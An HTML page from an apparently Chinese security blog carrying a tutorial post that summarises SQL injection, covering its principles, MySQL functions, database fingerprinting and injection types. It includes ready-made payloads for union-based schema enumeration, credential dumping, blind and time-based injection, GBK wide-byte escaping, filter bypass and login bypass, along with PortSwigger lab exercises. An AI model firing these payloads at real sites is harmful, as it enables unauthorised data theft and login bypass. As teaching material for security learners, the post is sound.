<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.cat.net/css?family=Lato:300,300italic,400,400italic,700,700italic|Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"swanq.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="让自己去触碰安全的blue sky">
<meta property="og:type" content="website">
<meta property="og:title" content="SwanQ&#39;s Blue SKY">
<meta property="og:url" content="http://swanq.top/page/3/index.html">
<meta property="og:site_name" content="SwanQ&#39;s Blue SKY">
<meta property="og:description" content="让自己去触碰安全的blue sky">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="swanQ">
<meta property="article:tag" content="penetration, forensics, web, cyber security">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://swanq.top/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>SwanQ's Blue SKY</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">SwanQ's Blue SKY</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">TO LIVE IS TO RISK IT ALL</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">58</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">28</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/13/2021-04-13/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="让自己去触碰安全的blue sky">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/13/2021-04-13/" class="post-title-link" itemprop="url">sql注入总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-13 20:00:01" itemprop="dateCreated datePublished" datetime="2021-04-13T20:00:01+08:00">2021-04-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-20 20:51:01" itemprop="dateModified" datetime="2021-04-20T20:51:01+08:00">2021-04-20</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>在本篇随笔当中将会介绍什么是SQL注入，如何查找和利用SQL注入及如何防止SQL注入</p>
<p><img src="/2021/04/13/2021-04-13/1.jpg"></p>
<h1 id="0x02-SQL注入"><a href="#0x02-SQL注入" class="headerlink" title="0x02 SQL注入"></a>0x02 SQL注入</h1><h2 id="1-原理："><a href="#1-原理：" class="headerlink" title="1. 原理："></a>1. 原理：</h2><p>客户端提交的表单数据被拼接到数据库的查询语句当中,被当作SQL语句的一部分执行。</p>
<p>SQL injection is a web security vulnerability that allows an attacker to  interfere with queries that an application  makes to its databases.It generally allows an attacker to view  data that not normally able to retrive.</p>
<h2 id="2-危害："><a href="#2-危害：" class="headerlink" title="2. 危害："></a>2. 危害：</h2><p>数据库信息泄漏、网页篡改、服务器被远程控制，被安装后门、网站被挂马，传播恶意软件(修改数据库一些字段的值，嵌入网马链接，进行挂马攻击)、数据库被恶意操作(数据库服务器被攻击，数据库的系统管理员帐户被窜改)、破坏硬盘数据，瘫痪全系统。</p>
<h2 id="3-相关-可跳过"><a href="#3-相关-可跳过" class="headerlink" title="3.相关(可跳过)"></a>3.相关(可跳过)</h2><h3 id="a-数据库分类及判断："><a href="#a-数据库分类及判断：" class="headerlink" title="a.数据库分类及判断："></a>a.数据库分类及判断：</h3><p>数据库分关系型数据库和非关系型数据库。</p>
<p><strong>关系型数据库</strong>：主要代表：Mysql、SQL Server、Oracle、PostgreSQL。关系型数据库是指采用了二维表格模型这种关系模型来组织数据的数据库。支持联表查询、使用正则表达式查询、嵌套查询，还可写独立的SQL脚本</p>
<p><strong>非关系型数据库</strong>：主要代表MongoDB，Redis、CouchDB。NoSQL非关系型数据库，主要指那些非关系型的、分布式的，且一般不保证ACID的数据存储系统。NoSQL以键值来存储，且结构不稳定，每个元组字段不同，不局限于固定结构，可以减少时间和空间开销。获取用户的不同信息时，仅需要根据key来取出对应的value值即可。</p>
<p>其中，判断后台数据库类型</p>
<h4 id="1-根据web语言判断："><a href="#1-根据web语言判断：" class="headerlink" title="1.根据web语言判断："></a>1.根据web语言判断：</h4><table>
<thead>
<tr>
<th>数据库类型</th>
<th>语言</th>
</tr>
</thead>
<tbody><tr>
<td>Mysql、PostgreSQL</td>
<td>PHP</td>
</tr>
<tr>
<td>Oracle、Mysql</td>
<td>Java</td>
</tr>
<tr>
<td>Oracle</td>
<td>JSP</td>
</tr>
<tr>
<td>MSSQL(Microsoft SQL Server)</td>
<td>ASP和.NET</td>
</tr>
</tbody></table>
<h4 id="2-根据操作系统："><a href="#2-根据操作系统：" class="headerlink" title="2.根据操作系统："></a>2.根据操作系统：</h4><p>Mysql：Apache</p>
<p>SQL server：windows(IIS)</p>
<h4 id="3-根据数据库报错判断："><a href="#3-根据数据库报错判断：" class="headerlink" title="3.根据数据库报错判断："></a>3.根据数据库报错判断：</h4><p>ａ．MYSQL数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>有mysql关键字，为MYSQL数据库。</p>
<p>ｂ．MSSQL数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft OLE DB Provider for ODBC Drivers 错误 &#39;80040e14&#39;  [Microsoft][ODBC SQL Server Driver][SQL Server]Line 1:</span><br></pre></td></tr></table></figure>

<p>mssql是微软的，由Microsoft和ODBC，为MSSQL数据库</p>
<p>ｃ．access数据库</p>
<p>Microsoft JET Database Engine错误’80040e14’错误的话，则是access数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line">详见：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;e308d96e2ecd</span><br></pre></td></tr></table></figure>

<p>ｄ．ORACLE数据库</p>
<p>ORA是ORACLE</p>
<p>以下都以Mysql为例</p>
<h3 id="b-常见函数："><a href="#b-常见函数：" class="headerlink" title="b.  常见函数："></a>b.  常见函数：</h3><ol>
<li><p>```</p>
<ol>
<li><p>version() MySQL 版本 select version()</p>
</li>
<li><p>user() 数据库用户名</p>
</li>
<li><p>database() 数据库名 select databases;</p>
</li>
<li><p>@@datadir 返回数据库的存储目录 select @@datadir;</p>
</li>
<li><p>@@version_compile_os 操作系统版本 select @@version_compile_os;</p>
</li>
<li><p>SQL 注释语句 (“–”与”/<em>…</em>/“)</p>
<p>(1)#<br>(2)–       表示单行注释<br>(3) /<em>comment</em>/    用于多行(块)注释<br>(4)/*! MYSQL Special SQL */</p>
</li>
<li><p>concat(str1,str2,…) 没有分隔符地连接字符串，如有任何一个参数为NULL ，则返回值为 NULL</p>
</li>
<li><p>concat_ws(separator,str1,str2,…) 含有分隔符地连接字符串</p>
</li>
<li><p>group_concat(str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每条数据</p>
</li>
<li><p>mid(str, pos, len);<br>substr();<br>substring()-从一个字符串中截取指定数量的字符</p>
</li>
<li><p>limit()  从某个值开始，取出之后的N条数据的语法 (返回结果中的前几条数据或者中间的数据)<br>select * from 表名 limit M,N;m是:指从m位开始(第一位为0)         n是:指取n条</p>
</li>
<li><p>order by 默认按照升序对记录进行排序， ORDER BY Company (DESC)</p>
</li>
<li><p>group by 结合合计函数，根据一个或多个列对结果集进行分组</p>
</li>
<li><p>sleep()<br>select sleep(N)可以让此语句运行N秒钟</p>
</li>
<li><p>if() 语法：<br>IF(expr1,expr2,expr3) 其中，expr1是判断条件，expr2和expr3是符合expr1的自定义的返回结果。</p>
</li>
<li><p>left() LEFT(str,len) 返回最左边的n个字符的字符串str，或NULL如果任何参数是NULL</p>
</li>
<li><p>count() COUNT(column_name) 语法 COUNT(column_name) 函数返回指定列的值的数目(NULL 不计入)</p>
</li>
<li><p>round()  四舍五入一个正数或者负数，结果为一定长度的值</p>
</li>
<li><p>hex() 16进制编码 select hex(‘dvwa’)  //编码         select unhex(‘64767761’)  //解码         </p>
<p>select 0x64767761  //16进制解码</p>
</li>
<li><p>ascii(arg) ：返回目标字符对应的ASCII码。   ord（arg）将字符转为ASCII     </p>
</li>
<li><p>char(arg)：返回ASCII码只对应的字符     语句：select char（97）</p>
</li>
<li><p>hex()：将目标字符串装换成16进制格式的数据     语句： select hex(“dvwa”)</p>
</li>
<li><p>unhex()：将16进制格式的数据装换成原字符串</p>
<pre><code>语句：unhex(64767761) 
</code></pre>
</li>
<li><p>load_file()读取文件</p>
</li>
<li><p>floor()返回小于等于X的最大整数</p>
</li>
<li><p>strcmp() 比较两个字符串ascii值的大小（大小写不敏感）</p>
</li>
<li><p>exp()返回e的X次方</p>
</li>
<li><p>Mysql可以使用的空白字符：<br>%09<br>%0a<br>%0b<br>%0c<br>%0d<br>%20<br>%a0<br>/**/</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### c. 常用语句：</span><br><span class="line"></span><br><span class="line">- 查库</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">select schema_name from imformation_schema.schemata;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>查表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_table <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> schema_name<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>查字段</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> colunm_name <span class="keyword">from</span> information_schema.colunms <span class="keyword">where</span> table_name<span class="operator">=</span>users <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>查数据</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> security.users;</span><br></pre></td></tr></table></figure>

<h3 id="d-常用名词："><a href="#d-常用名词：" class="headerlink" title="d. 常用名词："></a>d. 常用名词：</h3><p><strong>information_schema</strong></p>
<p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p>
<p><strong>SCHEMATA</strong></p>
<p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p>
<p><strong>TABLES</strong></p>
<p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p>
<p><strong>COLUMNS</strong></p>
<p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p>
</li>
</ol>
<h2 id="4-基本流程："><a href="#4-基本流程：" class="headerlink" title="4. 基本流程："></a>4. 基本流程：</h2><ol>
<li><p>判断是否有注入点</p>
</li>
<li><p>获取数据库基本信息</p>
<p>字段数：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n </span><br></pre></td></tr></table></figure></li>
<li><p>获取数据库库名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--获取系统数据库名</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,schema_name <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="comment">--获取当前数据库名</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,database()</span><br></pre></td></tr></table></figure></li>
<li><p>获取数据库表名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="comment">--或者</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><p>获取数据库列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>获取用户信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,group_concat(username,password) <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure></li>
<li><p>破解数据</p>
</li>
<li><p>提升权限</p>
</li>
<li><p>内网渗透</p>
</li>
</ol>
<h2 id="5-注入分类"><a href="#5-注入分类" class="headerlink" title="5. 注入分类"></a>5. 注入分类</h2><h3 id="按变量类型分"><a href="#按变量类型分" class="headerlink" title="按变量类型分"></a>按变量类型分</h3><ul>
<li>数字型注入:注入的参数为整数</li>
<li>字符型注入：注入的参数为字符/串</li>
<li>搜索注入：在搜索栏中利用恶意代码进行注入</li>
</ul>
<h3 id="按HTTP提交方式分"><a href="#按HTTP提交方式分" class="headerlink" title="按HTTP提交方式分"></a>按HTTP提交方式分</h3><ul>
<li><p>GET注入</p>
</li>
<li><p>POST注入：注入字段在POST数据中</p>
</li>
<li><p>Cookie注入：注入字段在Cookie数据中</p>
</li>
<li><p>XFF注入：XFF(X-Forward-For)，简称XFF头，它代表客户端真实的ip地址</p>
</li>
</ul>
<h3 id="按注入方式分"><a href="#按注入方式分" class="headerlink" title="按注入方式分"></a>按注入方式分</h3><ul>
<li><p>报错注入</p>
</li>
<li><p>盲注</p>
<ul>
<li><p>布尔盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; substr(database(),1,1)=&#x27;</span>t<span class="string">&#x27;--+     /*判断数据名长度*/</span></span><br></pre></td></tr></table></figure></li>
<li><p>时间盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> if(length(database())<span class="operator">&gt;</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>union注入 </p>
<p>列数相同且类型才能正常展示</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">/*获取字段*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h3><ul>
<li><p>宽字节注入</p>
<ol>
<li>宽字节是相对于ascII这样单字节而言；GB2312、GBK、GB18030、BIG5、Shift_JIS等都是宽字节，实际占两字节</li>
<li>一个gbk编码汉字，占2个字节。一个utf-8编码汉字，占3个字节</li>
<li>数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入</li>
</ol>
<p><strong>转义函数：</strong></p>
<p>为过滤用户输入，对特殊的字符加反斜杠“\”进行转义；</p>
<p>Mysql转义函数：addslashes，mysql_real_escape_string，mysql_escape_string等</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()过滤</li>
</ul>
<ul>
<li>数据库的编码为GBK</li>
<li>前一个ASCII码要大于128，才可以到达汉字的编码范围</li>
</ul>
<p><strong>利用方式:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">-1</span><span class="operator">%</span>DF<span class="string">&#x27; union select 1,user(),3,%23</span></span><br></pre></td></tr></table></figure>

<p>在上述条件下，单引号’被转义为%5c，所以就构成了**%df**%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;&gt;(addslashes)&#x3D;&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;&#x3D;&gt;(GBK)&#x3D;&#x3D;&#x3D;&#x3D;&gt;運’</span><br><span class="line">用户输入&#x3D;&#x3D;&gt;过滤函数&#x3D;&#x3D;&gt;代码层的$sql&#x3D;&#x3D;&gt;mysql处理请求&#x3D;&#x3D;&gt;mysql中的sql</span><br></pre></td></tr></table></figure>

<p><strong>防御：</strong></p>
<p>使用mysql_set_charset指定字符集且使用mysql_real_escape_string进行转义</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> character_set_connection<span class="operator">=</span>gbk, character_set_results<span class="operator">=</span>gbk,character_set_client<span class="operator">=</span><span class="type">binary</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集（使用mysql_set_charset指定字符集），不会出现前面的df和<span class="number">5</span>c拼接为一个宽字节的问题</span><br></pre></td></tr></table></figure></li>
<li><p>base64注入：注入字符串经过base64加密</p>
<p>对参数进行base64编码，再发送请求。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*id=1&#x27;，1的base64编码为MSc=，而=的url编码为%3d*/</span></span><br><span class="line">id<span class="operator">=</span>MSc<span class="operator">%</span><span class="number">3</span>d </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="3-注入绕过"><a href="#3-注入绕过" class="headerlink" title="3.注入绕过"></a>3.注入绕过</h2><ul>
<li><p><strong>大小写绕过</strong>：大小写不敏感</p>
</li>
<li><p><strong>双写绕过</strong>：将关键字select等只使用replace()函数置换为空，select变成seleselectct</p>
</li>
<li><p><strong>编码绕过</strong>（url全编码、十六进制）：</p>
<ul>
<li>十六进制绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where username &#x3D; 0x7465737431;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | test1    | pass     |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ascii 编码绕过</p>
<p>Test 等价于 CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
</li>
</ul>
</li>
<li><p><strong>内联注释绕过</strong> /* */</p>
</li>
<li><p><strong>关键字替换</strong></p>
<ul>
<li><p><strong>逗号绕过</strong></p>
<p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p>
<p>limit中可以利用offset来摆脱对逗号的利用</p>
</li>
<li><p><strong>比较符号( &gt;、&lt; )绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> <span class="operator">!</span>(id <span class="operator">&lt;&gt;</span> <span class="number">1</span>);</span><br><span class="line"><span class="comment">--等价于</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>逻辑符号的替换</strong>（and=&amp;&amp; or=|| xor=| not=!）</p>
</li>
<li><p><strong>空格绕过</strong>（用()，+等绕过）</p>
</li>
</ul>
</li>
<li><p><strong>等价函数绕过</strong></p>
<ul>
<li>hex()、bin()=ascii()</li>
<li>concat_ws()=group_concat()</li>
<li>mid()、substr()=substring()</li>
<li>sleep() –&gt;benchmark()</li>
</ul>
</li>
<li><p><strong>缓冲区溢出绕过</strong> (id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+ 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)</p>
</li>
</ul>
<p>到这儿大概可以拿下数据库的基本用户权限，若需提权需参考mysql MOF和UDF提权。</p>
<h2 id="4-练习："><a href="#4-练习：" class="headerlink" title="4. 练习："></a>4. 练习：</h2><p>以下为自己练习内容(可忽略)</p>
<h3 id="1-Retrieving-hidden-data"><a href="#1-Retrieving-hidden-data" class="headerlink" title="1.Retrieving hidden data"></a>1.Retrieving hidden data</h3><p><a target="_blank" rel="noopener" href="https://ac991fcc1e603304800c031d001b00e5.web-security-academy.net/filter?category=Gifts">where子句的SQLi允许查询隐藏数据</a></p>
<ul>
<li>测试是否存在注入：’   ‘’，内部服务器错误，存在sql注入。</li>
</ul>
<p><img src="/2021/04/13/2021-04-13/2.jpg"></p>
<ul>
<li>数据库正常查询语句：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;pets&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<ul>
<li>加单/双引号测试注入:内部服务器报错</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39;&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<ul>
<li>加双连接符注释掉后面内容：无category为空的内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39;--&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<ul>
<li>加入真命题，返回全部内容，包含发布与未发布的。release=1代表已发布的。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM products WHERE category &#x3D; &#39;&#39; or 1&#x3D;1 --&#39; AND release &#x3D; 1</span><br></pre></td></tr></table></figure>

<h3 id="2-Subverting-application-logic"><a href="#2-Subverting-application-logic" class="headerlink" title="2.Subverting application logic"></a>2.Subverting application logic</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/lab-login-bypass">登陆绕过</a></p>
<p><img src="/2021/04/13/2021-04-13/5.jpg"></p>
<p>与上面相同，这里不再过多赘述</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">正常查询语句：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;administrator&#39; AND password &#x3D; &#39;admin&#39;</span><br><span class="line">测试：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;&#39;&#39; AND password &#x3D; &#39;admin&#39;</span><br><span class="line">注释后成功注入：</span><br><span class="line">SELECT firstname FROM users WHERE  username &#x3D; &#39;administrator&#39;-- AND password &#x3D; &#39;admin&#39;</span><br></pre></td></tr></table></figure>



